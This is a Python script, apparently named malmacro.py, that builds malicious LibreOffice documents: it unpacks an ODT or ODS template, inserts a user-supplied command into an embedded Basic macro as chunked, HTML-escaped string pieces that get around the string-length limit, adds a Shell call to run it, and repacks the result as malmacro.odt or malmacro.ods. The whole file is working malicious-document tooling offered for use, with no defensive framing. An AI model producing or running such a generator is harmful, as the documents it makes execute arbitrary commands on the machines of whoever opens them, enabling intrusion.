#!/usr/bin/env python3

import html
from zipfile import ZipFile
import shutil
import sys

def makeMacro(filetype):
    suffix = ''
    if (filetype == "odt"):
        file = "macro.odt"
        suffix = "odt"
    elif (filetype == "ods"):
        file = "macro.ods"
    else:
        print("[-] ODT or ODS file support only")
        exit(1)

    # Extract contents of template file
    with ZipFile(file, "r") as zObject:
        zObject.extractall(path="./temp")

    with open("./temp/Basic/Standard/lemmy.xml") as f:
        data = f.read()

    # Format of macro is HTML Entity, so let's convert the command to this format
    # VBA has 255 character limit on string literals; bypass this by breaking command
    # into 50 char segments and store as string variable 
    chunks = chunkify(sys.argv[2])
    vbacode = '\tDim Str As String\n'
    for c in chunks:
        vbacode += c
    vbacode += '\tShell(Str)'
    # Replace placeholder with macro command content
    macro_cmd = data.replace("VBACODE", vbacode)

    # Overwrite XML file to include new macro command
    with open("./temp/Basic/Standard/lemmy.xml", "w") as f:
        f.write(macro_cmd)

    # Zip it all back up and rename it to malmacro.odt
    shutil.make_archive('malmacro', 'zip', 'temp')
    if suffix == "odt":
        shutil.move('malmacro.zip', 'malmacro.odt')
    else:
        shutil.move('malmacro.zip', 'malmacro.ods')

    # Cleanup
    shutil.rmtree('temp')

def chunkify(code):
    chunks = []
    n = 50
    for i in range(0, len(code), n):
        chunk = code[i:i + n]
        chunks.append('\tStr = Str + ' + html.escape('\"' + chunk + '\"') + '\n')
    return chunks

def main():
    if len(sys.argv) != 3:
        print("Usage: malmacro.py <odt|ods> <code_to_execute>")
        exit(1)
    else:
        makeMacro(sys.argv[1])
        exit(0)

if __name__ == '__main__':
    main()